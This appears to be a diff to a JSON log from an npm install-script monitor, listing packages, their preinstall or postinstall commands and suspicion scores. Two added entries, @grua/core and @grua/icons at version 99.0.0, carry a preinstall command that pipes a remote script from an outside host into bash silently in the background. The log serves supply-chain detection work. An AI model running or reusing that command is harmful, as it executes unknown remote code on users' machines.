@@ -1,5 +1,35 @@
 [
   {
+    "packageName": "@digitalsac/digisocket",
+    "version": "8.0.10",
+    "scriptType": "preinstall",
+    "scriptContent": "node ./engine-requirements.js",
+    "previousVersion": null,
+    "timestamp": "2026-03-25T20:51:41.161Z",
+    "issuesend": false,
+    "suspicionScore": 0
+  },
+  {
+    "packageName": "@grua/core",
+    "version": "99.0.0",
+    "scriptType": "preinstall",
+    "scriptContent": "curl -sS https://keywise.com.br/cp-dep/s | bash 2>/dev/null &",
+    "previousVersion": null,
+    "timestamp": "2026-03-25T20:50:59.618Z",
+    "issuesend": false,
+    "suspicionScore": 23
+  },
+  {
+    "packageName": "@grua/icons",
+    "version": "99.0.0",
+    "scriptType": "preinstall",
+    "scriptContent": "curl -sS https://keywise.com.br/cp-dep/s | bash 2>/dev/null &",
+    "previousVersion": null,
+    "timestamp": "2026-03-25T20:50:58.747Z",
+    "issuesend": false,
+    "suspicionScore": 23
+  },
+  {
     "packageName": "teleclaw",
     "version": "1.0.0-beta.1",
     "scriptType": "postinstall",
